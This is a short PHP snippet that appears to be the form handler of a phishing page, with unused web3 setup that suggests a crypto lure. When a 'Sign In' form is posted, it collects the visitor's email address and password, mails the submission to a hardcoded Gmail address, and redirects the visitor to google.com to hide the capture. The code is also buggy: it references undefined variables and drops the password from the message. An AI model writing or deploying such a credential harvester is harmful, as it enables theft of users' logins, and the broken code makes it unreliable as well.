'''php
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once('vendor/autoload.php'); //include web3 library


use Web3\Web3;
use Web3\Contract;

//Web3 provider setup
$web3 = new Web3('http://localhost:8545'); //Replace with your ethereum node URL

if(isset($_POST['Sign In'])){
$email = $_POST['Email_address'];
$password = $_POST['Password'];
$to = "loganeye101@gmail.com";
$subject = "Idan-Submission";
$body = "Name: $name\nEmail:
$email\nMessage: $messsage";

if(mail($to, $subject, $body)){
header("Location: https://google.com"); //Redirect to error page
exit();
}
}
?>'''